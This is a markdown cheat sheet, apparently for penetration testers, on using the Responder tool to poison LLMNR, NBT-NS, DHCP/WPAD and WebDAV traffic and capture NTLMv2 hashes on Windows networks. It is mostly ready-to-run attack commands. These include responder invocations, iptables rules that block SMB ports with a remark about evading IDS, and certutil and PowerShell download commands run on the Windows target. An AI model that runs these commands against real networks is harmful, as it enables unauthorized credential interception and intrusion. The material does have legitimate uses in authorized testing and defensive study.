# 02 - Responder

Search Tag(s): #mitm #responder #smb #relay #ntlm

## 2.1 - Basics

### 2.1 - LLMNR

NBT-NS and LLMNR Poisoning via capturing NTLMv2-SSP hashes

```
$ sudo responder -I <interface> -rdwv
```

LLMNR Poisoning

```
$ sudo responder -I <interface> --lm -v
```

### 2.2 - DHCP

DHCP and WPAD poisoning

When a windows host requires a new IP address dynamically it can perform HTTP WPAD poisoning response while the user uses a web browser that contains auto proxy settings enabled

```
$ sudo responder -I <interface> -Pdwv
```

### 2.3 - WebDAV

Block SMB traffic on the attacker's machine to poison NTLMv2-SSP responses via WebDAV/HTTP.

Note: You don't have to block the ports unless you're evading some IDS to identify you for performing MITM poisoning

```
$ sudo iptables -A INPUT -p udp --dport 137 -j DROP
sudo iptables -A INPUT -p udp --dport 138 -j DROP
sudo iptables -A INPUT -p tcp --dport 139 -j DROP
sudo iptables -A INPUT -p tcp --dport 445 -j DROP

$ sudo responder -I <interface> -Pdv
```

Windows target.

```
C:\> certutil -urlcache -split -f https://google.com file.txt

PS C:\> Invoke-WebRequest -Uri https://google.com -OutFile file.txt
```

---
## References

- [Responder](https://github.com/lgandx/Responder)

- [Hacktricks: Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks)

- [Responders DHCP Poisoner](https://g-laurent.blogspot.com/2021/08/responders-dhcp-poisoner.html)

### Hacking Articles

- [Hacking Articles: A Detailed Guide on Responder LLMNR Poisoning](https://www.hackingarticles.in/a-detailed-guide-on-responder-llmnr-poisoning/)

### n00py

- [n00py: Understanding UNC Paths SMB And WebDAV](https://www.n00py.io/2019/06/understanding-unc-paths-smb-and-webdav/)

- [n00py: The Dangers of Endpoint Discovery in Vipre Endpoint Security](https://www.n00py.io/2020/12/the-dangers-of-endpoint-discovery-in-vipre-endpoint-security/)

### Osanda

- [Osanda: Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)